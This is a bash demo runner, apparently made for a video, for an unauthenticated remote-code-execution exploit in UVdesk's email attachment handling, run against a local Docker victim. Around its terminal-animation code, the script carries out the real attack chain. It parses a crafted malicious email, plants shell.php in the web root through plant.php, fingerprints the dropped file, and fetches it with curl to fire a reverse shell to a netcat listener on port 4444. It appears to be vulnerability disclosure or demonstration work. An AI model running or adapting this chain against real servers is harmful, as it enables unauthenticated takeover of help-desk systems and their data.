#!/bin/bash
# Project Apex - UVdesk uploadEmailAttachment() unauth RCE - DEMO runner.
# Animated front-end for the video. Based on exploit.sh; same REAL actions
# (docker exec plant.php + curl trigger -> reverse shell), new optics.
#
# Layout budget: everything stays <= 66 visible columns (safe inside 71).
# Run ./start.sh first (victim up on :8930), `nc -l 4444` in another window,
# then this.
#
#   ./demo.sh            # full animated run (fires the real reverse shell)
#   ./demo.sh --static   # draw final frames only, no animation/no fire
#                         # (use for width-checking / screenshots)
set -euo pipefail
cd "$(dirname "$0")"

CONTAINER=apex-uvdesk-victim
PORT=8930
LPORT=4444
STATIC=0
[[ "${1:-}" == "--static" ]] && STATIC=1

# ── speed knobs (tune for the recording) ─────────────────────────────
DT=8                 # frame length in centiseconds (0.08s)
FRAMES_PER_STEP=14   # animation frames per step (~1.1s each)

# ── palette ──────────────────────────────────────────────────────────
BOLD=$'\033[1m'; DIM=$'\033[2m'; RST=$'\033[0m'
G=$'\033[38;2;110;231;150m'      # green
GD=$'\033[38;2;46;146;100m'      # dim green
C=$'\033[38;2;80;200;255m'       # cyan
W=$'\033[38;2;235;235;245m'      # white
GY=$'\033[38;2;120;120;135m'     # grey
R=$'\033[38;2;255;110;110m'      # red
HIDE=$'\033[?25l'; SHOW=$'\033[?25h'

SPIN=(⠋ ⠙ ⠹ ⠸ ⠼ ⠴ ⠦ ⠧ ⠇ ⠏)
BAR_W=12             # progress-bar cells

T=0                  # global elapsed, centiseconds (climbs across all steps)
clk()  { printf '%d.%02d' $((T/100)) $((T%100)); }

cleanup_term() { printf '%s' "$SHOW"; }
trap cleanup_term EXIT

# bar N filled of BAR_W -> "████▓░░░░░░░░"
bar() {
    local filled=$1 i out=""
    for ((i=0;i<BAR_W;i++)); do
        if   ((i<filled));      then out+="█"
        elif ((i==filled));     then out+="▓"
        else                         out+="░"; fi
    done
    printf '%s' "$out"
}

# animate one step in place; run $4 (REAL cmd) in background during the
# animation, then print its REAL stdout as the step's completion datum.
# $1 idx  $2 total  $3 label  $4 real-cmd  $5 display-prefix(optional)
# Globals set: STEP_OUT = raw stdout of the real cmd (for later steps).
step() {
    local idx=$1 total=$2 label=$3 cmd="${4:-}" prefix="${5:-}"
    local tmp="" pid=""
    if [[ -n "$cmd" ]]; then
        tmp=$(mktemp)
        bash -c "$cmd" >"$tmp" 2>/dev/null &
        pid=$!
    fi
    local f sp fill pct
    for ((f=0; f<FRAMES_PER_STEP; f++)); do
        sp=${SPIN[$(( (T/DT) % ${#SPIN[@]} ))]}
        fill=$(( f * BAR_W / FRAMES_PER_STEP ))
        pct=$(( f * 100 / FRAMES_PER_STEP ))
        printf '\r  %s%s%s %s%d/%d%s %s%-19s%s %s%s%s %s%3d%%%s %s%5ss%s\033[K' \
            "$C" "$sp" "$RST" "$DIM" "$idx" "$total" "$RST" \
            "$W" "$label" "$RST" \
            "$GD" "$(bar "$fill")" "$RST" \
            "$G" "$pct" "$RST" \
            "$DIM" "$(clk)" "$RST"
        T=$((T+DT))
        sleep "0.0${DT}"
    done
    [[ -n "$pid" ]] && wait "$pid" 2>/dev/null || true
    local raw=""
    [[ -n "$tmp" ]] && raw=$(cat "$tmp" 2>/dev/null) && rm -f "$tmp"
    STEP_OUT="$raw"
    # final line: check, label, and the REAL datum this step produced
    printf '\r  %s✓%s %s%d/%d%s %s%-19s%s %s%s%s\033[K\n' \
        "$G" "$RST" "$DIM" "$idx" "$total" "$RST" \
        "$W" "$label" "$RST" \
        "$G" "${prefix}${raw}" "$RST"
}

# centered box, inner width W_IN, pure-ASCII text so width math is exact
boxrow_edge() { local l=$1 r=$2 i; printf '  %s%s' "$BOLD$G" "$l"; for ((i=0;i<W_IN;i++)); do printf '═'; done; printf '%s%s\n' "$r" "$RST"; }
boxrow_text() {
    # $1 text, $2 visible length (caller supplies it; text may be multibyte)
    local txt=$1 len=$2 pad lp rp i
    pad=$((W_IN-len)); lp=$((pad/2)); rp=$((pad-lp))
    printf '  %s║%s' "$BOLD$G" "$RST"
    for ((i=0;i<lp;i++)); do printf ' '; done
    printf '%s%s%s' "$BOLD$G" "$txt" "$RST"
    for ((i=0;i<rp;i++)); do printf ' '; done
    printf '%s║%s\n' "$BOLD$G" "$RST"
}
W_IN=37

# ── header ───────────────────────────────────────────────────────────
clear
printf '%s' "$HIDE"
echo
cat banner_raw.txt
echo
echo "  ${GY}── apex · uvdesk · unauth · remote code execution ──${RST}"
echo
echo "  ${W}target  ${RST}${GY}127.0.0.1:${PORT}${RST}"
echo "  ${W}vector  ${RST}${GY}email attachment → mailbox cron${RST}"
echo "  ${W}auth    ${RST}${GY}none - zero credentials, zero click${RST}"
echo "  ${W}payload ${RST}${GY}reverse-shell → host:${LPORT}${RST}"
echo

if [[ $STATIC -eq 1 ]]; then
    # static: just draw a finished step + the box, for width/screenshot checks
    printf '  %s✓%s %s5/5%s %s%-22s%s %s%s%s %s100%%%s        %s 1.12s%s\n' \
        "$G" "$RST" "$DIM" "$RST" "$W" "deliver payload" "$RST" \
        "$G" "$(bar $BAR_W)" "$RST" "$G" "$RST" "$DIM" "$RST"
else
    T=0
    H=/var/www/app/poc-harness
    # 1 - parse the real attachment out of the crafted email (name · size · type)
    step 1 5 "compose payload" \
        "docker exec $CONTAINER php -r 'require \"$H/vendor/autoload.php\"; \$p=new PhpMimeMailParser\\Parser(); \$p->setText(file_get_contents(\"$H/malicious-email.eml\")); foreach(\$p->getAttachments() as \$a){echo \$a->getFilename().\" · \".strlen(\$a->getContent()).\"B · \".preg_replace(\"#.*/#\",\"\",\$a->getContentType());}'"
    # 2 - real recipient from the email's To: header
    step 2 5 "deliver to inbox" \
        "docker exec $CONTAINER sh -c \"grep -i '^to:' $H/malicious-email.eml | head -1 | sed 's/^[Tt]o: *//'\"" \
        "→ "
    # 3 - REAL: the unmodified uploadEmailAttachment() writes the file
    step 3 5 "mailbox cron ingest" \
        "docker exec $CONTAINER php $H/plant.php" \
        "wrote "
    PLANT_PATH="${STEP_OUT:-/assets/threads/999/shell.php}"
    # 4 - REAL: hash + mode of the file now sitting in the web root
    step 4 5 "fingerprint drop" \
        "docker exec $CONTAINER sh -c 'f=/var/www/app/public${PLANT_PATH}; printf \"sha256 %.12s… mode %s\" \$(sha256sum \$f | cut -c1-12) \$(stat -c %a \$f)'"
    # 5 - REAL: fetch the planted path -> fires the reverse shell into nc
    step 5 5 "fire reverse shell" \
        "curl -s --max-time 3 'http://127.0.0.1:${PORT}${PLANT_PATH}' >/dev/null 2>&1; echo \"GET .../\$(basename ${PLANT_PATH}) → :${LPORT}\""
fi

# ── result ───────────────────────────────────────────────────────────
echo
boxrow_edge "╔" "╗"
boxrow_text "▚ REMOTE CODE EXECUTION ▚" 25
boxrow_edge "╚" "╝"
echo
echo "  ${W}shell live${RST}  ${GY}uvdesk · uid=1001${RST}"
echo "  ${GD}reverse-shell → host:${LPORT}${RST}"
echo
printf '%s' "$SHOW"
